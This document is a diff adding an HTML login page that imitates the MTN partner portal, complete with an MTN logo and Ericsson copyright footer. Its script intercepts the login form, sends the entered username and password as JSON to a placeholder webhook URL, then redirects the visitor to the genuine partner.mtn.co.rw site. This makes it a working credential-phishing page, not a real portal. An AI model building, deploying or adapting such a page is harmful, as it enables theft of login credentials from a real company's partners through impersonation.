@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>MTN Partner Portal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: black;
+        }
+        header {
+            background-color: yellow; /* Added yellow background color */
+            color: black; /* Changed text color to black for contrast */
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+        }
+        nav ul li {
+            display: inline;
+            margin-right: 10px;
+        }
+        nav ul li a {
+            color: black; /* Changed text color to black for contrast */
+            text-decoration: none;
+        }
+        main {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-left: 50px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ffffff;
+        }
+        input[type="text"], input[type="password"] {
+            padding: 10px;
+            font-size: 16px;
+            width: 300px;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+            border: none;
+            background-color: #333333;
+            color: #ffffff;
+        }
+        input[type="submit"] {
+            padding: 10px 20px;
+            background-color: blue;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 10px;
+            margin-top: 10px;
+            width: 300px;
+            cursor: pointer;
+        }
+        footer {
+            background-color: #212121;
+            color: #ffffff;
+            padding: 10px;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        .logo-container {
+            position: absolute;
+            top: 20%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .logo {
+            width: 900px;
+            height: 90px;
+            background-image: url(https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.Gi_IMAotOnYyAPwZXuAZdQHaHa%26pid%3DApi&f=1&ipt=f1e5eecc2c2c3c4d95defabea8b6c35e3105c43611e5bb8eb454e64e0051f6aa&ipo=images);
+            background-repeat: no-repeat;
+            background-size: contain;
+            background-position: 10px;
+        }
+        h1 {
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+        .title {
+            margin-top: -50px;
+            color: #ffffff;
+            font-size: 24px;
+        }
+        .forgot-password, .first-login {
+            margin-top: 10px;
+            color: blue;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        .confidentiality-notice {
+            font-size: 12px;
+            color: #ffffff;
+            margin-top: 10px;
+            text-align: center;
+            line-height: 1.4;
+        }
+        .confidentiality-notice span {
+            color: red;
+        }
+        .password-toggle {
+            position: relative;
+            margin-left: 10px;
+            top: 2px;
+            cursor: pointer;
+        }
+        .password-toggle i {
+            font-size: 16px;
+            color: #ffffff;
+        }
+        .password-toggle.show-password i:before {
+            content: "\f070";
+        }
+        .password-toggle.hide-password i:before {
+            content: "\f06e";
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var passwordInput = document.querySelector('input[type="password"]');
+            var passwordToggle = document.querySelector('.password-toggle');
+            passwordToggle.addEventListener('click', function() {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    passwordToggle.classList.add('show-password');
+                    passwordToggle.classList.remove('hide-password');
+                } else {
+                    passwordInput.type = 'password';
+                    passwordToggle.classList.add('hide-password');
+                    passwordToggle.classList.remove('show-password');
+                }
+            });
+
+            // Webhook integration and redirection
+            var form = document.querySelector('form');
+            form.addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent default form submission
+
+                var formData = new FormData(form);
+                var data = {};
+                formData.forEach((value, key) => {
+                    data[key] = value;
+                });
+
+                fetch('YOUR_WEBHOOK_URL', { // Replace 'YOUR_WEBHOOK_URL' with your actual webhook URL
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Success:', result);
+                    window.location.href = 'https://partner.mtn.co.rw/'; // Redirect to the desired URL
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred while submitting the form.');
+                });
+            });
+        });
+    </script>
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="#">MTN PARTNER</a></li>
+                <li><a href="#">TRIAL</a></li>
+                <li><a href="#">SITE</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <div class="logo-container">
+            <div class="logo"></div>
+        </div>
+        <form action="check-login.php" method="post">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password">
+            <div class="password-toggle" tabindex="0" role="button" aria-label="Toggle password visibility">
+                <i class="fas fa-eye-slash"></i>
+            </div>
+            <input type="submit" value="Log In">
+        </form>
+        <div class="forgot-password" onclick="alert('Forgot Password?')">Forgot password?</div>
+        <div class="first-login" onclick="alert('First login?')">First login</div>
+        <p class="confidentiality-notice">
+            <span></span> This system processes sensitive data.<br>
+            <span></span> Misuse may cause considerable harm to the data subjects.<br>
+            <span></span> Be reminded of the confidentiality obligations you have when accessing this kind of data and the disciplinary consequences of improper handling.
+        </p>
+    </main>
+    <footer>
+        <p>© © Ericsson Mobile Financial Services AB 2013-2023 - All Rights Reserved. No part of this software may be reproduced in any form without the written permission of the copyright holder.</p>
+    </footer>
+</body>
+</html>
